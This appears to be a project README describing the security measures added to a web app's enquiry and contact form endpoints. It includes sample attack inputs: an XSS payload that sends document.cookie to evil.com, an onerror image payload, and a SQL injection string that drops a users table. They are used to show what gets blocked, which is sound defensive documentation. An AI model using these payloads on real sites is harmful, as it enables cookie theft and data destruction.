# Security Implementation - Enquiry & Contact Forms

## 🛡️ Complete Security Measures Implemented

All enquiry and contact form endpoints are now fully secured against common attacks.

---

## ✅ Security Features

### 1. **Input Sanitization** ✅
- **HTML/JS Removal**: All HTML tags and JavaScript are stripped from user input
- **Script Tag Blocking**: `<script>` tags are completely blocked
- **XSS Protection**: Prevents Cross-Site Scripting attacks
- **Library**: `isomorphic-dompurify` for server-side sanitization

**Implementation:**
```typescript
// All inputs are sanitized before validation
const sanitizedBody = sanitizeObject(body);
```

### 2. **Rate Limiting** ✅
- **IP-based Rate Limiting**: 5 requests per minute per IP address
- **Email-based Rate Limiting**: 3 requests per hour per email
- **DoS Protection**: Prevents spam and denial-of-service attacks
- **Automatic Cleanup**: Old rate limit entries are automatically cleaned

**Limits:**
- IP: 5 requests / minute
- Email: 3 requests / hour

### 3. **Enhanced Validation** ✅
- **Strict Length Limits**:
  - Full Name: Max 100 characters
  - Email: Max 100 characters
  - Phone: Max 20 characters
  - Subject: Max 200 characters
  - Message: Min 10, Max 5000 characters
- **Format Validation**:
  - Email: Proper format with domain check
  - Phone: International format validation
- **Content Validation**: HTML tags and scripts are blocked at validation level

### 4. **Security Headers** ✅
- **Content Security Policy (CSP)**: Prevents XSS attacks
- **X-XSS-Protection**: Browser XSS filter enabled
- **X-Content-Type-Options**: Prevents MIME sniffing
- **X-Frame-Options**: Prevents clickjacking
- **Referrer-Policy**: Controls referrer information
- **Permissions-Policy**: Restricts browser features

### 5. **SQL Injection Protection** ✅
- **Parameterized Queries**: Supabase uses parameterized queries automatically
- **Type Safety**: TypeScript ensures type safety
- **UUID Validation**: All IDs are validated as UUIDs

---

## 🔒 Security Layers

### Layer 1: Rate Limiting
```
Request → Rate Limit Check → Block if exceeded
```

### Layer 2: Input Sanitization
```
Request → Sanitize HTML/JS → Clean Input
```

### Layer 3: Validation
```
Sanitized Input → Zod Validation → Validated Data
```

### Layer 4: Database
```
Validated Data → Parameterized Query → Safe Storage
```

### Layer 5: Response Headers
```
Response → Security Headers → Secure Response
```

---

## 🚫 Blocked Attacks

### ✅ XSS (Cross-Site Scripting)
**Before:**
```javascript
{
  "message": "<script>alert('hacked')</script>"
}
```
**After:** Script tags are removed, only plain text stored

### ✅ SQL Injection
**Before:**
```javascript
{
  "email": "admin@test.com'; DROP TABLE users;--"
}
```
**After:** Parameterized queries prevent SQL injection

### ✅ DoS (Denial of Service)
**Before:** Unlimited requests possible
**After:** Rate limiting blocks excessive requests

### ✅ HTML Injection
**Before:**
```javascript
{
  "full_name": "<img src=x onerror='stealData()'>"
}
```
**After:** All HTML tags are stripped

### ✅ Script Injection
**Before:**
```javascript
{
  "message": "<script>fetch('evil.com/steal?data='+document.cookie)</script>"
}
```
**After:** Script tags are completely blocked

---

## 📊 Validation Rules

### Enquiry Form
- **Full Name**: 1-100 characters, no HTML
- **Email**: Valid email format, 5-100 characters
- **Phone**: International format, 1-20 characters
- **Company Name**: Optional, max 100 characters, no HTML
- **Message**: 10-5000 characters, no scripts

### Contact Form
- **Full Name**: 1-100 characters, no HTML
- **Email**: Valid email format, 5-100 characters
- **Phone**: International format, 1-20 characters
- **Subject**: 3-200 characters, no HTML/scripts
- **Message**: 10-5000 characters, no scripts

---

## 🔍 Security Headers Explained

### Content Security Policy (CSP)
```
default-src 'self'
```
- Only allows resources from same origin
- Blocks inline scripts and external resources

### X-XSS-Protection
```
X-XSS-Protection: 1; mode=block
```
- Enables browser's built-in XSS filter
- Blocks pages if XSS detected

### X-Content-Type-Options
```
X-Content-Type-Options: nosniff
```
- Prevents MIME type sniffing
- Forces browsers to respect declared content types

### X-Frame-Options
```
X-Frame-Options: DENY
```
- Prevents page from being embedded in iframes
- Protects against clickjacking

---

## 🧪 Testing Security

### Test XSS Protection
```bash
curl -X POST http://localhost:3000/api/public/enquiry \
  -H "Content-Type: application/json" \
  -d '{
    "full_name": "<script>alert(1)</script>",
    "email": "test@test.com",
    "phone": "1234567890",
    "message": "<script>alert(1)</script>"
  }'
```
**Result:** Script tags are removed, only plain text stored

### Test Rate Limiting
```bash
# Send 6 requests quickly
for i in {1..6}; do
  curl -X POST http://localhost:3000/api/public/enquiry \
    -H "Content-Type: application/json" \
    -d '{"full_name":"Test","email":"test@test.com","phone":"123","message":"Test message"}'
done
```
**Result:** 6th request returns 429 (Too Many Requests)

### Test Validation
```bash
curl -X POST http://localhost:3000/api/public/enquiry \
  -H "Content-Type: application/json" \
  -d '{
    "full_name": "A",
    "email": "invalid-email",
    "phone": "",
    "message": "short"
  }'
```
**Result:** Validation errors for all fields

---

## 📝 Security Best Practices

### ✅ Implemented
- Input sanitization
- Rate limiting
- Enhanced validation
- Security headers
- Parameterized queries
- Type safety

### 🔄 Optional Enhancements (Future)
- CAPTCHA integration (Google reCAPTCHA v3)
- Honeypot fields (hidden fields for bots)
- IP whitelisting/blacklisting
- Request logging and monitoring
- Email verification
- Two-factor authentication for admin

---

## 🚀 Production Recommendations

1. **Use Redis for Rate Limiting**: For distributed systems, use Redis instead of in-memory store
2. **Enable Logging**: Log all security events (rate limit hits, validation failures)
3. **Monitor**: Set up alerts for suspicious activity
4. **Regular Updates**: Keep security packages updated
5. **Security Audits**: Regular security audits and penetration testing

---

## 📚 Files Modified

1. `utils/sanitize.ts` - Input sanitization utilities
2. `middlewares/rate-limit.ts` - Rate limiting middleware
3. `middlewares/security-headers.ts` - Security headers
4. `validators/enquiry.ts` - Enhanced validation
5. `validators/contact.ts` - Enhanced validation
6. `backend/controllers/enquiry.ts` - Security integration
7. `backend/controllers/contact.ts` - Security integration

---

## ✅ Security Checklist

- [x] Input sanitization
- [x] Rate limiting (IP + Email)
- [x] Enhanced validation
- [x] Length limits
- [x] Format validation
- [x] Security headers
- [x] SQL injection protection
- [x] XSS protection
- [x] DoS protection
- [x] Type safety

---

**Security Implementation Complete!** 🛡️

All enquiry and contact forms are now fully secured against common web attacks.

